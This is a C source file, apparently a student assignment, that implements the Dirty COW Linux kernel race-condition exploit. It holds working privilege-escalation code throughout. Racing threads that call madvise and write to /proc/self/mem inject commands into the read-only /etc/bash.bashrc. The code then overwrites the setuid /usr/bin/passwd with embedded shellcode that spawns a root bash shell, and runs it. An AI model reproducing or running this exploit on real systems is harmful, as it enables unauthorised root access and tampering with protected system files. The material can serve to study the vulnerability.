/*
PB15111662 李双利
PB15111658 王新
*/
 
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
 
void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;
 
char suid_binary[] = "/usr/bin/passwd";
 
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;
 

char suid_binary0[] = "/etc/bash.bashrc";
char sc0[] = 
  "echo 0 > /proc/sys/vm/dirty_writeback_centisecs\n"
  "touch /success\n"
  "chown root:root /success\n"
  "echo  done!\n"
  "ls /success -ahl\n"
;

void *madviseThread0(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread0(void *arg)
{
  char *str;
  str=(char*)arg;
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
} 

void *madviseThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        c+=madvise(map,100,MADV_DONTNEED);
    }
    printf("thread stopped\n");
}
 
void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        lseek(f,map,SEEK_SET);
        c+=write(f, str, sc_len);
    }
    printf("thread stopped\n");
}
 
void *waitForWrite(void *arg) {
    char buf[sc_len];
 
    for(;;) {
        FILE *fp = fopen(suid_binary, "rb");
 
        fread(buf, sc_len, 1, fp);
 
        if(memcmp(buf, sc, sc_len) == 0) {
            printf("%s is overwritten\n", suid_binary);
            break;
        }
 
        fclose(fp);
        sleep(1);
    }
 
    stop = 1;
 
    printf("Popping root shell.\n");
    printf("Don't forget to restore /tmp/bak\n");
    system(suid_binary);
}
 
int main(int argc,char *argv[]) {

    //bash.bashrc写入命令
    pthread_t pth01,pth02;
    f=open(suid_binary0,O_RDONLY);
    fstat(f,&st);
    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    pthread_create(&pth01,NULL,&madviseThread,suid_binary0);
    pthread_create(&pth02,NULL,&procselfmemThread,sc0);
    pthread_join(pth01,NULL);
    pthread_join(pth02,NULL);
    printf("xieru!\n");

    //获得root权限
    char *backup;
 
    printf("DirtyCow root privilege escalation\n");
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);
 
    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
    system(backup);
 
    f = open(suid_binary,O_RDONLY);
    fstat(f,&st);
 
    printf("Size of binary: %d\n", st.st_size);
 
    char payload[st.st_size];
    memset(payload, 0x90, st.st_size);
    memcpy(payload, sc, sc_len+1);
 
    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
 
    printf("Racing, this may take a while..\n");
 
    pthread_create(&pth1, NULL, &madviseThread, suid_binary);
    pthread_create(&pth2, NULL, &procselfmemThread, payload);
    pthread_create(&pth3, NULL, &waitForWrite, NULL);
    pthread_join(pth3, NULL);
 
 
    return 0;
}
